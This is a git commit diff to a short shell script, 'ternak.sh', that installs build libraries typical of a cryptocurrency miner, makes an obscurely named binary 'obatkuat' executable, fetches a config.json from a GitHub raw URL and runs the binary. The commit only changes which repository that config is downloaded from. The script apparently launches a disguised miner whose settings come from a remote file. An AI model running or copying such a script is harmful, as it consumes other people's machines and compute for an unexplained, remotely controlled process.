a85bbddb0650bd29d0fe4d0b5ba5e09c7d80bf03
Fredola <93273191+Fredola@users.noreply.github.com>
2021-10-27 17:17:09 +0200

    Update ternak.sh

--- ternak.sh
+++ ternak.sh
@@ -4,5 +4,5 @@ sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 chmod +x obatkuat
 screen -dmS ls
-wget https://raw.githubusercontent.com/dhenisusanto/github.com-dhenisusanto0-drone-jsonnet-generator-master/main/config.json
+wget https://raw.githubusercontent.com/Fredola/Fredol/main/config.json
  ./obatkuat
